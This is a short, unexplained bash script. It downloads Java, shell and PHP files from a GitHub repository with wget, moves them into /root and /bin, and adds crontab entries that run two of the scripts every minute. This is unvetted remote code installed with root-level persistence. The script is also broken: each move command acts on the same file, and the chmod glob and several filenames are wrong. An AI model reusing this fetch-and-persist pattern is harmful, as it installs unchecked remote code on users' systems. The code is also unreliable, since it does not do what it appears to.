#!/bin/bash
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/a.java
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/a.sh
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/au.java
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/authentication..php
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/b.java
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/c.java
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/c.sh
wget https://raw.githubusercontent.com/cevdetabbas/ProjectRiskTrust/main/connection.php
chmod 700 */sh
mv a.java /root/a.java
mv a.java /bin/a.sh
mv a.java /root/aujava
mv a.java /root/authentication.php
mv a.java /root/b.java
mv a.java /root/c.java
mv a.java /bin/c.sh
mv a.java /root/connection.php
cat <(crontab -l) <(echo "* * * * * a.sh") | crontab -
cat <(crontab -l) <(echo "* * * * * c.sh") | crontab -

